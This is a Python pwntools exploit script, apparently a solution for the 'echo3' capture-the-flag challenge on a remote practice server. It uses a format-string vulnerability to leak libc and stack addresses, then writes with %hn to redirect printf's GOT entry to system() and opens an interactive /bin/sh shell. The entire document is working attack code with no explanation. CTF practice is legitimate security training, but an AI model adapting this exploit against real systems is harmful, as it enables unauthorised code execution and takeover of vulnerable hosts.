from pwn import *
import time
context.log_level = 'debug'

while True:
	#p = process('./echo3',env = {"LD_PRELOAD": "../libc-2.23.so.i386"})
	p = remote('hackme.inndy.tw',7720)
	payload = '%55$p.%14$p'
	p.sendline(payload)
	data = p.recvuntil('.',drop = True)
	if data[-3:] == '637':
		break
	p.close()

__libc_start_main_ret = int(data,16)
stack_base = int(p.recvuntil('\n',drop = True),16) - 0x10
log.success('stack_base : 0x%x ' %stack_base)
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ad80
printf_got = 0x0804A014
libc_base = __libc_start_main_ret - offset___libc_start_main_ret
system_addr = libc_base + offset_system
log.success('system addr : 0x%x ' %system_addr)

sleep(1)

payload = '%' + str( (stack_base + 0x2c) & 0xffff ) + 'c%38$hn'
payload += '%' + str( ((stack_base + 0x4c) & 0xffff) - ((stack_base + 0x2c) & 0xffff)) + 'c%39$hn'
p.sendline(payload)
sleep(1)
#gdb.attach(p)
payload = '%' + str( printf_got & 0xffff) + 'c%93$hn'
payload += '%' + str( ((printf_got+2) & 0xffff) - (printf_got & 0xffff) ) + 'c%95$hn'
p.sendline(payload)
sleep(2)

payload = '%' + str( system_addr & 0xffff ) + 'c%19$hn'
payload += '%' + str( ((system_addr >> 16) & 0xffff) - (system_addr & 0xffff) ) + 'c%11$hn'
#gdb.attach(p)
p.sendline(payload)

p.sendline('/bin/sh')
p.interactive()
